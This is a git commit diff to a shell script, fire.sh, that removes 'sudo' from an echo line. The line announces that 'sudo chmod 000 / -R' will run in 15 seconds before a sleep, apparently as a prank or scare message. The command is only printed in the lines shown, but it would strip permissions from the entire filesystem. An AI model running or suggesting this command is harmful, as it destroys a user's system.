d8ace6db67d6a69c1a83037aebb7b7806a2b356c
burner-account-sh <148162856+burner-account-sh@users.noreply.github.com>
2023-11-08 18:29:43 +0300

    Update fire.sh

--- fire.sh
+++ fire.sh
@@ -2,5 +2,5 @@
 echo "	"
 echo "  "
 echo "  "
-sudo echo "Super User Will now run the command 'sudo chmod 000 / -R' in 15 seconds"
+echo "Super User Will now run the command 'sudo chmod 000 / -R' in 15 seconds"
 sleep 15s
